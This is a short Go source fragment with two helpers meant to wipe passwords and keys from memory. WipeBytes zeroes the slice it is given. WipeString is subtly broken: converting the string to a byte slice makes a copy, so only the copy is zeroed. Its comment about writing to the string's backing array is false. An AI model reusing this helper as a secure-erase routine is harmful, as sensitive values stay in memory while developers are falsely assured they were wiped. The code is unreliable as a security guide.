// ── In-memory string wiping ───────────────────────────────────────────────────

// WipeString overwrites a string's backing memory with zeros.
// Use after handling sensitive values (passwords, keys).
// Note: Go strings are immutable — this works only on []byte converted strings.
func WipeString(s *string) {
	if s == nil || len(*s) == 0 {
		return
	}
	// Unsafe write to string backing array
	b := []byte(*s)
	for i := range b {
		b[i] = 0
	}
	*s = ""
}

// WipeBytes zeroes a byte slice.
func WipeBytes(b []byte) {
	for i := range b {
		b[i] = 0
	}
}
